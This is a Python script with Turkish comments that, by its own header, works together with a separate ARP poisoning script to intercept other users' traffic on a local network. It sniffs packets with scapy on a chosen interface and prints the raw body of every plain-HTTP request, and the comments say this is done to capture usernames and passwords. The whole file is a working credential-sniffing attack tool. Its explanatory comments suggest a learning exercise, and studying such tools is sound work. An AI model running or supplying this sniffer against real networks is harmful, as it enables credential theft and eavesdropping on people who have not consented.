#Bu script Arp poison script'i ile beraber calistirilmalidir. Bu script paketlerden gelen verileri goruntuler. Paket gonderme islemi Arp poison script'i ile gerceklestirilir
import scapy.all as scapy
from scapy_http import http #Bu islem sadece http olan sitelerde calisir
import optparse

def User_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-i","--interface",dest="interface",help="Kullanicinin internete nasil baglandigi bilgisini almak icin kullanilir\n Ornegin eger kullanici kablolu baglaniyorsa eth0 olarak girdi yapmalidir")
    user_input = parse_object.parse_args()[0]#parse_args bir options ve bir arguments degeri verir bu degerlerden sadece options degerini almak icin [0] yapilir
    if not user_input.interface:
        print("Interface bilgisi girilmedi!!")
    return user_input

def listen_packet(interface):
    scapy.sniff(iface=interface,store=False,prn=analyze_packet)
    #interface=eth0 internete bagli olma seklimizi belirtiriz.
    #store = False olmasi alinan paketleri hafizaya kaydetmemesini gosterir
    #prn = Paketler geldikce paketleri input alarak yollayacagi fonksiyonu sorgular

def analyze_packet(packet):
    #if kontrolunun sebebi gelen paket bilgileri icinden password ve username bilgilerinin katmanini bulmaktir. Bu bilgiler, layer'lar icinde bulunmaktadir. En ust katman http katmanidir
    #ilk olarak bu katmanin olup olmadigi if ile kontrol edilir.Eger http layer'i varsa bir alt katmana bakilir.
    #haslayer metodu ile http.HTTPRequest layer(katman) kontrolu yapilir.
    #Eger HTTPRequest katmani da varsa bir alt katman ve son katman olan Raw katmaninin varligi kontrol edilir. Username ve password bu katman altinda bulunmaktadir.
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load) #Username ve password bilgileri Raw katmani altinda load'a esitlenmis olarak bulunmaktadir.
                                          #Bu satirda Raw katmani altindaki load degerini yazdirip bu bilgiler goruntulenir.
user_input_enter = User_input()
user_interface = user_input_enter.interface
listen_packet(user_interface)